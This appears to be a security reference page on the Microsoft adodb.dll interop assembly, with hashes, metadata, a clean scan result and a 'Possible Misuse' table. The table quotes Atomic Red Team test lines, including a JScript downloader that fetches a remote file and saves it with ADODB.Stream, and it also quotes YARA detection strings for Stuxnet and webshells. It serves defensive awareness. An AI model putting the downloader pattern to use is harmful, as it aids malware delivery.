---
title: adodb.dll | 
excerpt: What is adodb.dll?
---

# adodb.dll 

* File Path: `C:\Program Files (x86)\Microsoft.NET\Primary Interop Assemblies\adodb.dll`

## Hashes

Type | Hash
-- | --
MD5 | `7ECB661F50F34A941A44DAC7241F7D08`
SHA1 | `772B0DF3AD4A89A078CD4FF8E5F45115778D04A2`
SHA256 | `E2386B60A73FA7C95A8968161FB1C84DD9143462B2880133778A3027F75730F2`
SHA384 | `94BC89485CF528FFF0D9A8E3FF11DE5FFADC3F4D5A19998E68C9C69506D30FECB69EE8B9D42865CA511474BA5629D0D3`
SHA512 | `AA007A71DA51B145A7FC702A0CD8930D43E03A884C331AFB48DE01E82E06C20D2A5325AAA893D03A25E5B670E9E0A03F002B55D9620202B6B48045E4A79B577B`
SSDEEP | `3072:hwfedMeM6hIHUBcDudgvSf4OhCsXTgME3bw:hwfedMT6hIHUBcDudgvSf4OhCsjgd`
IMP | `DAE02F32A21E03CE65412F6E56942DAA`
PESHA1 | `550E7BF41E3D61B7577896B8914CB0C9343B3F30`
PE256 | `0C3CC83DCD373878252D791A209196326CF889D301DF6DC560CA20A137EE7689`


## Signature

* Status: The file C:\Program Files (x86)\Microsoft.NET\Primary Interop Assemblies\adodb.dll is not digitally signed. You cannot run this script on the current system. For more information about running scripts and setting execution policy, see about_Execution_Policies at https:/go.microsoft.com/fwlink/?LinkID=135170
* Serial: ``
* Thumbprint: ``
* Issuer: 
* Subject: 

## File Metadata

* Original Filename: 
* Product Name: Microsoft Visual Studio .NET
* Company Name: Microsoft Corporation
* File Version: 7.10.2346
* Product Version: 7.10.2346
* Language: English (United States)
* Legal Copyright: Copyright Microsoft Corporation.  All rights reserved.
* Machine Type: 32-bit

## File Scan

* VirusTotal Detections: 0/66
* VirusTotal Link: https://www.virustotal.com/gui/file/e2386b60a73fa7c95a8968161fb1c84dd9143462b2880133778a3027f75730f2/detection/

## Possible Misuse

*The following table contains possible examples of `adodb.dll` being misused. While `adodb.dll` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1204.002.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1204.002/T1204.002.md) | echo var url = "#{file_url}", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > #{script_file} | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1204.002.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1204.002/T1204.002.md) | $sheet.Cells.Item(12,1) = "=FWRITELN(A5, `"Set oStream = CreateObject(`"`"ADODB.Stream`"`")`")" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_stuxnet.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_stuxnet.yar) | $s6 = "@abf varbinary(4096) EXEC @hr = sp_OACreate 'ADODB.Stream', @aods OUT IF @hr <> 0 GOTO endq EXEC @hr = sp_OASetProperty @" wide | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [thor-hacktools.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/thor-hacktools.yar) | $s7 = "<%set Conn = Server.CreateObject(\"ADODB.Connection\") " fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)



MIT License. Copyright (c) 2020 Strontic.


